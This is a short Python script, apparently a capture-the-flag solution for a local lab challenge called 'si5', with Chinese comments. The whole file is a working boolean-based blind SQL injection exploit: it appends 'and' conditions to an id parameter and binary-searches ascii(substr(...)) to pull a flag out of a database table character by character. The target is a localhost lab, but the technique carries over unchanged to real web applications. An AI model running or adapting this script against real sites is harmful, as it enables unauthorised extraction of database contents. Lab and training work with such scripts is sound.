# 布尔盲注解题脚本（si5）——只用 Python 标准库
# 用法：python blind_boolean.py
import urllib.request, urllib.parse

URL = "http://localhost:8083/si5/"
TABLE = "flag5_table"

def ask(cond):
    payload = "1 and " + cond
    r = urllib.request.urlopen(URL + "?id=" + urllib.parse.quote(payload)).read().decode()
    return "查询到了" in r

flag = ""
for pos in range(1, 60):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if ask("ascii(substr((select flag from %s),%d,1))>%d" % (TABLE, pos, mid)):
            lo = mid + 1
        else:
            hi = mid
    c = chr(lo)
    flag += c
    print(flag)
    if c == "}":
        break
print("FLAG:", flag)
